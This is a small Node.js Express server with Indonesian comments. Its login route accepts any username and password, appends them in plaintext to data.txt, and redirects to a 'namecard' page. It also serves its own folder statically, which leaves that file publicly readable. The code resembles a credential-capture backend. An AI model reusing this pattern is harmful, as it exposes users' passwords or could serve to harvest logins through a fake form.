const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));

// Layani file statis dari folder saat ini
app.use(express.static(__dirname));

// Rute untuk menangani pengiriman form
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Simpan data ke file .txt
    const data = `Username: ${username}, Password: ${password}\n`;
    fs.appendFile('data.txt', data, (err) => {
        if (err) throw err;
        console.log('Data tersimpan ke data.txt');
    });

    // Setelah berhasil menyimpan, arahkan ke halaman kartu nama
    res.redirect('/namecard'); // Redirect ke rute /namecard
});

// Rute untuk menampilkan halaman kartu nama
app.get('/namecard', (req, res) => {
    res.sendFile(path.join(__dirname, 'namecard.html')); // Rerender halaman kartu nama
});

app.listen(port, () => {
    console.log(`Server berjalan di http://localhost:${port}`);
});
